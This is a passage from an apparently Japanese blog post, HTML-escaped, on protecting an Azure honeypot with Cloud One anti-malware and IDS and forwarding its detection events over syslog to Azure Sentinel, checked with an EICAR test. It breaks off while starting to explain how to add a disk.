    style=&quot;padding-bottom: 70.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB9ElEQVQ4y3WT6ZLaMBCE/f6vlh+pIsmGxcEYn1i+7wPsjnq8IlQ2cdUUthh90z0aWa7rIfACTNOEZVkwzzO6tkXbtMizHIEfIMsyRFGEOIrRdR34bNv2KdZ1hfXDduF5noTrugjDEK0GjuOIvu+lyP1+R1VVaJoGdV1LMIdrfH88HgJjnvXVtQXk+76EUko2DsMgao0aAqjObP47uC7Ag39BEASi8Hw+I45jqWrU8WEy14zC/wEpwEr9L3Auu+00VWK5LEsJ9o3WqZAFqIBh2kCIUfwE/nw/4HQ6iW0CbrfbU0lRFALmgRFI263+5RrtE/yqkt+Wc7wIiLYdx3keikkwCj6aCUzLn2/g04lb6nQQdbSc57kEFf4r+aFtdkUE73qVwmbUXvMsz/6Gq05gEJYkidgOswq5tmxs89T1FtSTLtg2ksv/DNSott6O76KOIA4wg4DvuUJW7jCePA+Bzzwv0j8G59C4YmsE+Mu2Bcj542YCabmsjvpdybeZwWmeMM7D/j9z0wwqUUi0I2PdIowKONRpmkq1um4Qh662HguQSozlalT6WmrLaS4xDqNc1d2B7iEhJoxlGRvd00LDuU4gN2zbinbcr1tyU0jVXozqOVYsahUfjTdhgFMRaGCmE4fnia8aOC7dfo/LCn3bi8LXMfoNTQUwDlc7vOEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0eec95449ec99e0b992f29f6a0026f93/8ac56/image-22.webp 240w,
/static/0eec95449ec99e0b992f29f6a0026f93/d3be9/image-22.webp 480w,
/static/0eec95449ec99e0b992f29f6a0026f93/05ca6/image-22.webp 719w&quot;
              sizes=&quot;(max-width: 719px) 100vw, 719px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0eec95449ec99e0b992f29f6a0026f93/8ff5a/image-22.png 240w,
/static/0eec95449ec99e0b992f29f6a0026f93/e85cb/image-22.png 480w,
/static/0eec95449ec99e0b992f29f6a0026f93/073e9/image-22.png 719w&quot;
            sizes=&quot;(max-width: 719px) 100vw, 719px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0eec95449ec99e0b992f29f6a0026f93/073e9/image-22.png&quot;
            alt=&quot;image-22.png&quot;
            title=&quot;image-22.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;リアルタイムのアンチマルウェア機能とホスト型IDSを有効化してます。&lt;/p&gt;
&lt;p&gt;このホスト型IDSは、端末内のDockerコンテナ間の通信もフィルタできるので(たぶん)色々防いでくれるはずです。&lt;/p&gt;
&lt;p&gt;あとホストマシンが侵害されないように、「変更監視、セキュリティログ監視」という機能も有効化しています。&lt;/p&gt;
&lt;p&gt;これで設定ファイルとかシステム内の重要ファイルが改ざんされたらイベントを発生してくれます。&lt;/p&gt;
&lt;h3 id=&quot;dns名の構成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dns%E5%90%8D%E3%81%AE%E6%A7%8B%E6%88%90&quot; aria-label=&quot;dns名の構成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DNS名の構成&lt;/h3&gt;
&lt;p&gt;仮想マシンにアクセスするためにマシンに割り当てるパブリックIPの設定でDNS名を構成します。&lt;/p&gt;
&lt;p&gt;この設定を行うことで、パブリックIPを動的割り当てにした場合でも常に同じFQDNで接続することが可能になります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e6114111a096ad9a34d95ea92a220506/0b533/image-55-164640097941129.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 77.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACAUlEQVQ4y31Uy5LaMBD0///G5gZfk+TCjQC7gLElWU/LltyZkbELCBtVdWHGmlbPTMtVfWvwdalxbSTqRsCGAcOY0dgRV3pXX68QQqBtW0zThHfrMV4ZYyBVB+ccnLX8mjZkHBuHz/MFbdNAaw3vPXJKJTmljBBjifd9v5IyKkskShsIqSgpYBxHUjiioc2G8Kgg9BFSSnBOH4eVcCErhMfzGbdWzJuCRyAlrLbV/apuWUI7XC5X2mv+KXklPHUWX60pJTEhw3P5pkeksljxsgb6H8JcRbqX/7qqkWLpJZ5zxp/PMzolywGOFAXv5nYMQ8GijEuOkdDPqHgI8yCm9cREhLU0UFJQciTSUOK/f/3Ej48PbLdbbDYb7Ha7cvhMGguqx/oXwpwndNqWsoqSpYdK43A44nQ6Yb/fQylVJr+oHgnVa2OXknlzSaBnBtMKM6DryELOzopIWWcdrPNlBtzf94Tkw0Y2lNw92cZTwoXMXwsNbWxxhAwZMT0M5TuFwkiw6R/j/TBCdAa2H0obeEhM+mSb9wonSDJ7uA9jNTYl605RIHOw9I/7lu5tYXyrsCOb8P1lky9x7tWB7NTScAbyWiTPpfxs8G8JNTWbe8gfBh4ALxczbvTRkJ6R0LgRin79kMsB/+nhbBu+t4yF0N4JVUhoiYyfa0NfJYLw8835C3G1kaBDBTzzAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e6114111a096ad9a34d95ea92a220506/8ac56/image-55-164640097941129.webp 240w,
/static/e6114111a096ad9a34d95ea92a220506/d3be9/image-55-164640097941129.webp 480w,
/static/e6114111a096ad9a34d95ea92a220506/b0a15/image-55-164640097941129.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e6114111a096ad9a34d95ea92a220506/8ff5a/image-55-164640097941129.png 240w,
/static/e6114111a096ad9a34d95ea92a220506/e85cb/image-55-164640097941129.png 480w,
/static/e6114111a096ad9a34d95ea92a220506/0b533/image-55-164640097941129.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e6114111a096ad9a34d95ea92a220506/0b533/image-55-164640097941129.png&quot;
            alt=&quot;image-55.png&quot;
            title=&quot;image-55.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;固定IPによる接続でもいいですが、無駄にコストがかかるのと、IPでのアクセスは柔軟性が無いのでDNS名を設定しておくのが良いと思います。&lt;/p&gt;
&lt;h2 id=&quot;azure-sentinelの構築&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#azure-sentinel%E3%81%AE%E6%A7%8B%E7%AF%89&quot; aria-label=&quot;azure sentinelの構築 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Azure Sentinelの構築&lt;/h2&gt;
&lt;p&gt;Azure SentinelはAzureの提供しているSIEMサービスです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://azure.microsoft.com/ja-jp/services/microsoft-sentinel/#overview&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Sentinel – クラウドネイティブの SIEM ソリューション | Microsoft Azure&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Common Event Format (CEF) Syslog メッセージを収集するLinuxエージェントを踏み台サーバにインストールする&lt;/li&gt;
&lt;li&gt;踏み台サーバで、ハニーポットマシンからの514ポートのインバウンド通信を許可する&lt;/li&gt;
&lt;li&gt;Cloud OneのSyslogイベントをハニーポットマシンから踏み台サーバに転送するように構成する&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;踏み台サーバにlinux-agentをインストールする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%ABlinux-agent%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;踏み台サーバにlinux agentをインストールする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;踏み台サーバにLinux Agentをインストールする&lt;/h3&gt;
&lt;p&gt;Cloud OneとAzure Sentinelの連携については、以下のようにAzure Sentinel側の「データコネクタ」に詳細な手順が書かれています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2a017365d5cfe2a47c166f12bb75bcc9/0b533/image-23.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 53.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAABVUlEQVQoz5VSW1LDMAzM/U/FHfjlA5qmLWWal235FWeR1LjTYYCCZnbiyNZ6rVVz2Lfoug5932McRxB5pJSxlgU11nV9CIlSCppluRaasOAyGoToMQwXOCY1PiDnXFkVUiSoJDVqrskpaSJEJrCOCRIrjIhLQW8I1kc4QUigmG8EKXJunuGI4L2/KW2kuB6Yhh4f53dM4wBPDtZahTFGYa3RfPCEaeL2OAcfExx/IwuT1zTkrC4C3zKezzidjko6MrkUe973tIHXtMGwuv2+w9vbK3a7Hdq2xcy5RjYklHRTRPyMtLXip5D90/GoRl7VW80pYW1oYYPEpPr/m6MioBoq7arRhOCV4K9RCaV3/Wy1NjNxzTdOG03q7n9mjphwsF7NsNx/HyLKKgrZsfubv87XNxIhJ3TwlyArFrPwHLMHmQf7nuAh2d2ZiTKeXmY8H4hz5YZPhEFewEj2la8AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2a017365d5cfe2a47c166f12bb75bcc9/8ac56/image-23.webp 240w,
/static/2a017365d5cfe2a47c166f12bb75bcc9/d3be9/image-23.webp 480w,
/static/2a017365d5cfe2a47c166f12bb75bcc9/b0a15/image-23.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2a017365d5cfe2a47c166f12bb75bcc9/8ff5a/image-23.png 240w,
/static/2a017365d5cfe2a47c166f12bb75bcc9/e85cb/image-23.png 480w,
/static/2a017365d5cfe2a47c166f12bb75bcc9/0b533/image-23.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2a017365d5cfe2a47c166f12bb75bcc9/0b533/image-23.png&quot;
            alt=&quot;image-23.png&quot;
            title=&quot;image-23.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これを参考に、踏み台サーバにSyslog Agentをインストールします。&lt;/p&gt;
&lt;p&gt;インストールのためのPythonが必要なので、まずはパッケージをインストールしておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; python -y&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次に、「データコネクタ」に表示されている以下のようなコマンドを実行して、Agentをインストールします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; -O cef_installer.py https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/DataConnectors/CEF/cef_installer.py&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; python cef_installer.py &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;TENANT&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;TOKEN&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;踏み台サーバの514ポート待ち受けを有効化する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE514%E3%83%9D%E3%83%BC%E3%83%88%E5%BE%85%E3%81%A1%E5%8F%97%E3%81%91%E3%82%92%E6%9C%89%E5%8A%B9%E5%8C%96%E3%81%99%E3%82%8B&quot; aria-label=&quot;踏み台サーバの514ポート待ち受けを有効化する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;踏み台サーバの514ポート待ち受けを有効化する&lt;/h3&gt;
&lt;p&gt;セキュリティグループの設定を変更して、ハニーポットマシンからの514ポートあての通信を受け入れる設定を実施しました。&lt;/p&gt;
&lt;h3 id=&quot;cloud-oneのsyslogイベントをハニーポットマシンから踏み台サーバに転送するように構成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cloud-one%E3%81%AEsyslog%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%E3%82%92%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%8B%E3%82%89%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AB%E8%BB%A2%E9%80%81%E3%81%99%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E6%A7%8B%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;cloud oneのsyslogイベントをハニーポットマシンから踏み台サーバに転送するように構成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cloud OneのSyslogイベントをハニーポットマシンから踏み台サーバに転送するように構成する&lt;/h3&gt;
&lt;p&gt;まずCloud One側で踏み台サーバの514ポートに検出イベントを転送する設定をいれます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 862px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1af645f7caefa0b4ba714f1c00ca5f10/f0551/image-25.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABc0lEQVQoz52SWW+DMBCE+Z1NFKKIKEmvl6o/uICgEG4wKVemO6aOUJWX1tLIB7vjb9dY76dnvB0esV+v4axWOG5sOA8rHDYbPO12OG23ONmzjrZ9Wy/FnBfHwet+Dys5n0GdoxiB56MuKmRxgjIvMfYDcL3iL8OK4xiXywVlWcIXwzwvZP8F1Sg0dYO+78XzinEc0Uoc53sahgGTxFlJkmhDpRSyNNPrrutuM82MmLTcG03TpKUJwzBEXddSdoIwCBF9RlpVWaFV7U/gTNg0zUwiZ9wv57ZtkabpXDLpeEAimvODudEMJhZFcTNcipRsmeu6sM7yILw5yzJUVaUNTU+XpjRkDHtqyIy4Z7zneTMhN7kEMyHPc017j5Bxpo+/CQnj+z6sIAhQCZWSfvGQj2Rolwk0YslsC9fUkpB/x4crhLq8WiFOSxRCEMjD8KGiKNLlsx0052xawUtN3ymeE4IX6pLZF44oU1Bth14oeiH4z/gGmfI1KPYbqrIAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1af645f7caefa0b4ba714f1c00ca5f10/8ac56/image-25.webp 240w,
/static/1af645f7caefa0b4ba714f1c00ca5f10/d3be9/image-25.webp 480w,
/static/1af645f7caefa0b4ba714f1c00ca5f10/e32b8/image-25.webp 862w&quot;
              sizes=&quot;(max-width: 862px) 100vw, 862px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1af645f7caefa0b4ba714f1c00ca5f10/8ff5a/image-25.png 240w,
/static/1af645f7caefa0b4ba714f1c00ca5f10/e85cb/image-25.png 480w,
/static/1af645f7caefa0b4ba714f1c00ca5f10/f0551/image-25.png 862w&quot;
            sizes=&quot;(max-width: 862px) 100vw, 862px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1af645f7caefa0b4ba714f1c00ca5f10/f0551/image-25.png&quot;
            alt=&quot;image-25.png&quot;
            title=&quot;image-25.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで試しにEicarをハニーポットマシンで検出させてみると、Azure Sentinelのポータルで検出イベントが確認できました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 530px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0bd98c2a6a97378984c1f37340305a7f/b6a9b/image-26.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 131.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAaCAYAAAC3g3x9AAAACXBIWXMAAAsTAAALEwEAmpwYAAADCUlEQVRIx5VVy47TQBDMF3LmG/gkxGUvcAMJIXHmsgcQiI04hSWb3SR+JH7Ejh+xPXbR1ck43pCwYKnl8UxPTXd19Xh04+R4djXD8zcPePHeQZYm+DWdYjKZYLlcYjabYbFYYDweY1eWcNMGD0tXxgXKpoMbpojCAKZtkZQNRnFe49Ntgg/fI3z8FsJ1Xdze/sT07g7z+RxTAV+tVthsNqh2O2zLGoUAN3WNXVWj3FU6X8t3JTYCOgAGaFrUmUGaptjEMbbbrVoqEVdVBT5dR9+uH+v34W1t1EqobWfdLj97MN2PbuB8uk8Bhydesn/x6SP8V+f/BnwEPOTpzIHH9C8ADkF773Pzf5nrOWyqnWqJIEUh+hJZ1KbFtqhUDvThu2kaNZ0zBnllsM1yVQP3UA0jogZxgi8/JqKcTmWTJBsU4uzFGYo8U4CdaM1anucKTCH7qzWWIvwgCHSvAnoi3IW7wnyxRLKJcSeiTkTInuNop9zf38shieozDMOnUzamgWlqjUSFLZuZBkFIAVPhO8syXc/zQgHpXx4i5hp9FJCHGUNgo4vcsN1mwk8m7VXpPEE5R0DOK6+SNilI2VFimfB5ADxKgSet12vdeCoX8maf0319yjx96BBKtR3hjpeEBdD2FIuiCL7v62H0tfNDGzHVYSSMMBbyudleEBaYY66RltMoL3YKK8l7kDLglUUAe9uEwT56Al9q10eAbdv1HFKow66gsepcYyH26jBqw/EfEZIfRsKUKQvLVb8mHDN6AvPi9TxXvzmm9YDHooSaMqMYFoRrjuth6bh6U9uIbDuejZBmiY8lQuXORkjZFClMvpHbvThm9VRRCMZ0yKWtbte1elm8u1nj1bWL118l7VxELb8NXhBF3fb2KGWtslSWXOhPRyKsqj2PVWPwdhzi5bWPq88rPATSmlmJMM3VIr6T/HxRhiTzALtW5/LDSgP5mcUIJAulRoxiJ/f+uaKwuuySYUvZwgRhBMfz4fmrw4H+gJYLHKaiNYIyMp4aiVlNco7VH7bdqbB/AxP85jvF4pZ4AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0bd98c2a6a97378984c1f37340305a7f/8ac56/image-26.webp 240w,
/static/0bd98c2a6a97378984c1f37340305a7f/d3be9/image-26.webp 480w,
/static/0bd98c2a6a97378984c1f37340305a7f/c2b64/image-26.webp 530w&quot;
              sizes=&quot;(max-width: 530px) 100vw, 530px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0bd98c2a6a97378984c1f37340305a7f/8ff5a/image-26.png 240w,
/static/0bd98c2a6a97378984c1f37340305a7f/e85cb/image-26.png 480w,
/static/0bd98c2a6a97378984c1f37340305a7f/b6a9b/image-26.png 530w&quot;
            sizes=&quot;(max-width: 530px) 100vw, 530px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0bd98c2a6a97378984c1f37340305a7f/b6a9b/image-26.png&quot;
            alt=&quot;image-26.png&quot;
            title=&quot;image-26.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;今はこれだけですが、今後は何かAzure Sentinel上での分析とかもやっていけるとよさそうです。&lt;/p&gt;
&lt;h2 id=&quot;補足ハニーポットマシンのディスク拡張&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A3%9C%E8%B6%B3%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AE%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E6%8B%A1%E5%BC%B5&quot; aria-label=&quot;補足ハニーポットマシンのディスク拡張 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;補足：ハニーポットマシンのディスク拡張&lt;/h2&gt;
&lt;p&gt;もし仮想マシンにディスクを追加する場合は、Azureコンソールから追加ディスクを設定した後、普通にLinuxにマウントするのと同じように設定が必要です。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;lsblk&lt;/code&gt;でディスクの一覧を確認します。&lt;/p&gt;
